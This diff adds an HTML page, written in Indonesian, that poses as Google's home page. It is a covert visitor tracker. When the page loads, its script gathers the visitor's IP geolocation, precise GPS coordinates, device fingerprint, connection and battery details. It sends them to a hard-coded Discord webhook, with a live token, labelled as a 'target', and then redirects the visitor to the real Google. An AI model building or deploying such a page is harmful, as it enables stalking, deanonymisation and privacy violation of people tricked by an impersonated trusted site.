@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        /* --- STYLING GOOGLE CLONE --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 600px;
+            width: 100%;
+        }
+        .logo {
+            font-size: 92px;
+            font-weight: 500;
+            letter-spacing: -4px;
+            margin-bottom: 20px;
+            user-select: none;
+        }
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        .search-box {
+            width: 100%;
+            max-width: 580px;
+            border: 1px solid #dfe1e5;
+            border-radius: 24px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            background: #fff;
+            box-shadow: 0 1px 6px rgba(32,33,36,0.08);
+            transition: box-shadow 0.2s;
+        }
+        .search-box:hover,
+        .search-box:focus-within {
+            box-shadow: 0 1px 12px rgba(32,33,36,0.25);
+            border-color: rgba(223,225,229,0);
+        }
+        .search-box input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            padding: 8px 0;
+            font-family: inherit;
+            color: #202124;
+        }
+        .search-box input::placeholder {
+            color: #9aa0a6;
+        }
+        .search-box .icon {
+            color: #9aa0a6;
+            font-size: 20px;
+            margin-right: 12px;
+        }
+        .search-box .mic-icon {
+            color: #4285F4;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .buttons {
+            margin-top: 28px;
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .buttons button {
+            background: #f8f9fa;
+            border: 1px solid #f8f9fa;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 14px;
+            color: #3c4043;
+            cursor: pointer;
+            transition: all 0.1s;
+            font-family: inherit;
+        }
+        .buttons button:hover {
+            box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+            background: #f8f9fa;
+            border-color: #dadce0;
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #f2f2f2;
+            padding: 12px 20px;
+            font-size: 14px;
+            color: #70757a;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            border-top: 1px solid #dadce0;
+        }
+        .footer a {
+            color: #70757a;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .footer .left,
+        .footer .right {
+            display: flex;
+            align-items: center;
+        }
+        .loading-indicator {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #70757a;
+        }
+        .loading-indicator.show {
+            display: block;
+        }
+        .status-debug {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+            max-width: 500px;
+            text-align: center;
+            display: none;
+        }
+        .status-debug.show {
+            display: block;
+        }
+        @media (max-width: 600px) {
+            .logo {
+                font-size: 64px;
+            }
+            .search-box {
+                padding: 10px 16px;
+            }
+            .search-box input {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Logo Google -->
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
+
+        <!-- Kotak pencarian -->
+        <div class="search-box">
+            <span class="icon">🔍</span>
+            <input type="text" placeholder="Telusuri atau ketik URL" id="searchInput" autofocus>
+            <span class="mic-icon">🎤</span>
+        </div>
+
+        <!-- Tombol -->
+        <div class="buttons">
+            <button id="btnSearch">Telusuri Google</button>
+            <button id="btnLucky">Saya Lagi Beruntung</button>
+        </div>
+
+        <!-- Indikator -->
+        <div class="loading-indicator" id="loadingIndicator">⏳ Mengumpulkan data...</div>
+        <div class="status-debug" id="statusDebug"></div>
+    </div>
+
+    <!-- Footer Google -->
+    <div class="footer">
+        <div class="left">
+            <a href="#">Tentang</a>
+            <a href="#">Beriklan</a>
+            <a href="#">Bisnis</a>
+            <a href="#">Cara kerja Penelusuran</a>
+        </div>
+        <div class="right">
+            <a href="#">Privasi</a>
+            <a href="#">Syarat</a>
+            <a href="#">Pengaturan</a>
+        </div>
+    </div>
+
+    <script>
+        // ================================================================
+        //  KONFIGURASI — UBAH SESUAI KEBUTUHAN
+        // ================================================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1528320405486567474/8nh1rlfZ0Q1j_BjN_N5g81mZV_Gwle4j9Mw3H6fDhB7u6AfKHV2W-cF_BgyxRf6AZ6ET';
+        const REDIRECT_TARGET = 'https://www.google.com'; // Ganti dengan URL tujuan redirect
+
+        // ================================================================
+        //  FUNGSI UTAMA: KUMPULKAN DATA & KIRIM KE DISCORD
+        // ================================================================
+        async function runTracking() {
+            const debugEl = document.getElementById('statusDebug');
+            const loadingEl = document.getElementById('loadingIndicator');
+
+            loadingEl.classList.add('show');
+            debugEl.classList.add('show');
+            debugEl.textContent = '⏳ Mengambil data...';
+
+            // Objek data utama
+            const data = {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString('id-ID', {
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                }),
+                ip: 'Tidak terdeteksi',
+                ipDetails: null,
+                gps: null,
+                device: null,
+                connection: null,
+                battery: null,
+                provider: 'Tidak diketahui'
+            };
+
+            // --- 1. AMBIL IP & GEOLOKASI (DENGAN FALLBACK) ---
+            debugEl.textContent = '⏳ Mengambil IP dan lokasi...';
+
+            // Coba ip-api.com (HTTPS)
+            try {
+                const resp = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
+                if (resp.ok) {
+                    const json = await resp.json();
+                    if (json.status === 'success') {
+                        data.ip = json.query;
+                        data.ipDetails = {
+                            country: json.country || '-',
+                            countryCode: json.countryCode || '-',
+                            region: json.regionName || '-',
+                            city: json.city || '-',
+                            zip: json.zip || '-',
+                            latitude: json.lat || null,
+                            longitude: json.lon || null,
+                            timezone: json.timezone || '-',
+                            isp: json.isp || '-',
+                            org: json.org || '-',
+                            as: json.as || '-',
+                            asname: json.asname || '-',
+                            reverse: json.reverse || '',
+                            mobile: json.mobile || false,
+                            proxy: json.proxy || false,
+                            hosting: json.hosting || false
+                        };
+                        debugEl.textContent = '✅ IP dan lokasi berhasil (ip-api.com)';
+                    } else {
+                        throw new Error(json.message || 'ip-api.com gagal');
+                    }
+                } else {
+                    throw new Error('ip-api.com response ' + resp.status);
+                }
+            } catch (e) {
+                debugEl.textContent = '⚠️ ip-api.com gagal, mencoba freeipapi...';
+                // Fallback 1: freeipapi.com
+                try {
+                    const resp2 = await fetch('https://freeipapi.com/api/json');
+                    if (resp2.ok) {
+                        const json2 = await resp2.json();
+                        data.ip = json2.ipAddress || 'Tidak terdeteksi';
+                        data.ipDetails = {
+                            country: json2.countryName || '-',
+                            countryCode: json2.countryCode || '-',
+                            region: json2.regionName || '-',
+                            city: json2.cityName || '-',
+                            zip: json2.zipCode || '-',
+                            latitude: json2.latitude || null,
+                            longitude: json2.longitude || null,
+                            timezone: json2.timeZone || '-',
+                            isp: 'Tidak diketahui',
+                            org: 'Tidak diketahui',
+                            as: 'Tidak diketahui',
+                            asname: 'Tidak diketahui',
+                            reverse: '',
+                            mobile: false,
+                            proxy: false,
+                            hosting: false
+                        };
+                        debugEl.textContent = '✅ IP dan lokasi berhasil (freeipapi.com)';
+                    } else {
+                        throw new Error('freeipapi.com gagal');
+                    }
+                } catch (e2) {
+                    debugEl.textContent = '⚠️ freeipapi gagal, mencoba ipify...';
+                    // Fallback 2: ipify.org (hanya IP)
+                    try {
+                        const resp3 = await fetch('https://api.ipify.org?format=json');
+                        if (resp3.ok) {
+                            const json3 = await resp3.json();
+                            data.ip = json3.ip || 'Tidak terdeteksi';
+                            debugEl.textContent = '✅ IP berhasil (ipify.org), lokasi tidak tersedia';
+                        } else {
+                            throw new Error('ipify.org gagal');
+                        }
+                    } catch (e3) {
+                        debugEl.textContent = '❌ Semua API IP gagal. Gunakan IP lokal.';
+                        data.ip = 'Tidak terdeteksi';
+                    }
+                }
+            }
+
+            // --- 2. AMBIL GPS PRESISI (dengan timeout 5 detik) ---
+            debugEl.textContent = '⏳ Meminta GPS (izin diperlukan)...';
+
+            try {
+                const gps = await new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve(null);
+                        return;
+                    }
+                    let resolved = false;
+                    const timeout = setTimeout(() => {
+                        if (!resolved) {
+                            resolved = true;
+                            resolve(null);
+                        }
+                    }, 5000);
+
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            if (!resolved) {
+                                resolved = true;
+                                clearTimeout(timeout);
+                                resolve({
+                                    latitude: pos.coords.latitude,
+                                    longitude: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    altitude: pos.coords.altitude || null,
+                                    speed: pos.coords.speed || null,
+                                    heading: pos.coords.heading || null
+                                });
+                            }
+                        },
+                        (err) => {
+                            if (!resolved) {
+                                resolved = true;
+                                clearTimeout(timeout);
+                                resolve(null);
+                            }
+                        }, {
+                            enableHighAccuracy: true,
+                            timeout: 4000,
+                            maximumAge: 0
+                        }
+                    );
+                });
+                data.gps = gps;
+                if (gps) {
+                    debugEl.textContent = '✅ GPS berhasil diambil';
+                } else {
+                    debugEl.textContent = '⚠️ GPS tidak tersedia / izin ditolak';
+                }
+            } catch (e) {
+                data.gps = null;
+                debugEl.textContent = '⚠️ GPS error: ' + e.message;
+            }
+
+            // --- 3. DEVICE FINGERPRINT ---
+            const ua = navigator.userAgent;
+            data.device = {
+                userAgent: ua,
+                platform: navigator.platform || '-',
+                language: navigator.language || '-',
+                languages: navigator.languages ? navigator.languages.join(', ') : '-',
+                hardwareConcurrency: navigator.hardwareConcurrency || null,
+                deviceMemory: navigator.deviceMemory || null,
+                screen: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth || '-',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
+                vendor: navigator.vendor || '-',
+                webdriver: navigator.webdriver || false
+            };
+
+            // --- 4. KONEKSI ---
+            if (navigator.connection) {
+                data.connection = {
+                    type: navigator.connection.effectiveType || 'unknown',
+                    downlink: navigator.connection.downlink || null,
+                    rtt: navigator.connection.rtt || null,
+                    saveData: navigator.connection.saveData || false
+                };
+            }
+
+            // --- 5. BATERAI ---
+            if (navigator.getBattery) {
+                try {
+                    const bat = await navigator.getBattery();
+                    data.battery = {
+                        level: bat.level,
+                        charging: bat.charging,
+                        chargingTime: bat.chargingTime,
+                        dischargingTime: bat.dischargingTime
+                    };
+                } catch (e) {
+                    data.battery = null;
+                }
+            }
+
+            // --- 6. EKSTRAK PROVIDER dari ISP atau User-Agent ---
+            let provider = 'Tidak diketahui';
+            if (data.ipDetails && data.ipDetails.isp && data.ipDetails.isp !== '-') {
+                provider = data.ipDetails.isp;
+            } else {
+                const uaL = ua.toLowerCase();
+                if (uaL.includes('telkomsel')) provider = 'Telkomsel';
+                else if (uaL.includes('xl')) provider = 'XL Axiata';
+                else if (uaL.includes('indosat')) provider = 'Indosat Ooredoo';
+                else if (uaL.includes('smartfren')) provider = 'Smartfren';
+                else if (uaL.includes('three') || uaL.includes('tri')) provider = 'Tri';
+                else if (uaL.includes('wifi')) provider = 'WiFi';
+                else if (uaL.includes('ethernet')) provider = 'Ethernet';
+            }
+            data.provider = provider;
+
+            debugEl.textContent = '📤 Mengirim data ke Discord...';
+
+            // --- 7. KIRIM KE DISCORD ---
+            await sendToDiscord(data);
+
+            debugEl.textContent = '✅ Data terkirim. Redirect dalam 3 detik...';
+
+            // --- 8. REDIRECT ---
+            setTimeout(() => {
+                window.location.href = REDIRECT_TARGET;
+            }, 3000);
+        }
+
+        // ================================================================
+        //  KIRIM KE DISCORD
+        // ================================================================
+        async function sendToDiscord(data) {
+            const ipd = data.ipDetails;
+            const gps = data.gps;
+            const dev = data.device;
+            const conn = data.connection;
+            const bat = data.battery;
+
+            // Bangun deskripsi
+            let desc = '';
+
+            // IP & Lokasi
+            desc += `**🌐 IP Address:** ${data.ip || 'Tidak terdeteksi'}\n`;
+            if (ipd) {
+                desc += `**📍 Lokasi:** ${ipd.city || '-'}, ${ipd.region || '-'}, ${ipd.country || '-'}\n`;
+                if (ipd.latitude && ipd.longitude) {
+                    desc += `**🗺️ Koordinat IP:** ${ipd.latitude}, ${ipd.longitude}\n`;
+                }
+                desc += `**🕒 Timezone:** ${ipd.timezone || '-'}\n`;
+                desc += `**🏢 ISP:** ${ipd.isp || '-'}\n`;
+                desc += `**🏛️ Organisasi:** ${ipd.org || '-'}\n`;
+                desc += `**🔗 ASN:** ${ipd.as || '-'} (${ipd.asname || '-'})\n`;
+                if (ipd.reverse) desc += `**↩️ Reverse DNS:** ${ipd.reverse}\n`;
+                desc += `**📱 Mobile:** ${ipd.mobile ? 'Ya' : 'Tidak'} | **🔒 Proxy:** ${ipd.proxy ? 'Ya' : 'Tidak'} | **☁️ Hosting:** ${ipd.hosting ? 'Ya' : 'Tidak'}\n`;
+            }
+
+            // GPS
+            if (gps) {
+                desc += `\n**🛰️ GPS Presisi:**\n`;
+                desc += `Lat: ${gps.latitude.toFixed(6)}, Lon: ${gps.longitude.toFixed(6)}\n`;
+                desc += `Akurasi: ±${gps.accuracy ? gps.accuracy.toFixed(0) : '?'} meter\n`;
+                if (gps.altitude) desc += `Altitude: ${gps.altitude} m\n`;
+                if (gps.speed) desc += `Kecepatan: ${gps.speed} m/s\n`;
+                desc += `[🗺️ Buka di Google Maps](https://www.google.com/maps?q=${gps.latitude},${gps.longitude})\n`;
+            } else {
+                desc += `\n**🛰️ GPS:** Tidak tersedia / izin ditolak\n`;
+            }
+
+            // Perangkat
+            if (dev) {
+                desc += `\n**💻 Perangkat:**\n`;
+                desc += `User-Agent: \`${(dev.userAgent || '-').substring(0, 200)}${(dev.userAgent || '').length > 200 ? '...' : ''}\`\n`;
+                desc += `Platform: ${dev.platform || '-'}\n`;
+                desc += `Bahasa: ${dev.language || '-'}\n`;
+                desc += `Resolusi: ${dev.screen || '-'} (${dev.colorDepth || '-'} bit)\n`;
+                desc += `Timezone: ${dev.timezone || '-'}\n`;
+                desc += `CPU: ${dev.hardwareConcurrency || '?'} core, RAM: ${dev.deviceMemory ? dev.deviceMemory + ' GB' : '?'}\n`;
+                desc += `Vendor: ${dev.vendor || '-'}\n`;
+            }
+
+            // Koneksi
+            if (conn) {
+                desc += `\n**📶 Koneksi:**\n`;
+                desc += `Tipe: ${conn.type || 'unknown'}\n`;
+                if (conn.downlink) desc += `Kecepatan turun: ${conn.downlink} Mbps\n`;
+                if (conn.rtt) desc += `RTT: ${conn.rtt} ms\n`;
+                desc += `Save Data: ${conn.saveData ? 'Aktif' : 'Tidak'}\n`;
+            }
+
+            // Baterai
+            if (bat) {
+                desc += `\n**🔋 Baterai:**\n`;
+                desc += `Level: ${Math.round(bat.level * 100)}%\n`;
+                desc += `Charging: ${bat.charging ? 'Ya' : 'Tidak'}\n`;
+            }
+
+            desc += `\n**📡 Provider:** ${data.provider || 'Tidak diketahui'}`;
+            desc += `\n\n**🕒 Waktu Lokal:** ${data.localTime || '-'}`;
+
+            // Embed
+            const embed = {
+                title: '⬡ TARGET DETEKSI LENGKAP',
+                description: desc,
+                color: 0x00ccff,
+                timestamp: data.timestamp,
+                footer: {
+                    text: 'Soulvant Tracker • Google Clone'
+                },
+                fields: [
+                    { name: '🌐 IP', value: data.ip || '-', inline: true },
+                    { name: '📍 Kota', value: ipd ? ipd.city || '-' : '-', inline: true },
+                    { name: '🏢 ISP', value: ipd ? ipd.isp || '-' : '-', inline: true },
+                    { name: '📱 Provider', value: data.provider || '-', inline: true },
+                    { name: '🖥️ OS', value: dev ? dev.platform || '-' : '-', inline: true },
+                    { name: '🌍 Timezone', value: dev ? dev.timezone || '-' : '-', inline: true }
+                ]
+            };
+
+            // Tambahkan peta IP jika ada koordinat
+            if (ipd && ipd.latitude && ipd.longitude) {
+                embed.fields.push({
+                    name: '🗺️ Peta IP',
+                    value: `[Buka Peta](https://www.google.com/maps?q=${ipd.latitude},${ipd.longitude})`,
+                    inline: true
+                });
+            }
+
+            const payload = { embeds: [embed] };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    const errText = await response.text();
+                    console.error('Discord error:', response.status, errText);
+                }
+            } catch (e) {
+                console.error('Error kirim ke Discord:', e);
+            }
+        }
+
+        // ================================================================
+        //  EVENT LISTENER
+        // ================================================================
+        document.addEventListener('DOMContentLoaded', () => {
+            // Jalankan tracking
+            runTracking();
+
+            // Tombol Telusuri
+            document.getElementById('btnSearch').addEventListener('click', () => {
+                const q = document.getElementById('searchInput').value;
+                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q);
+            });
+
+            // Tombol Saya Lagi Beruntung
+            document.getElementById('btnLucky').addEventListener('click', () => {
+                const q = document.getElementById('searchInput').value;
+                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q) + '&btnI=1';
+            });
+
+            // Enter
+            document.getElementById('searchInput').addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    const q = document.getElementById('searchInput').value;
+                    window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(q);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
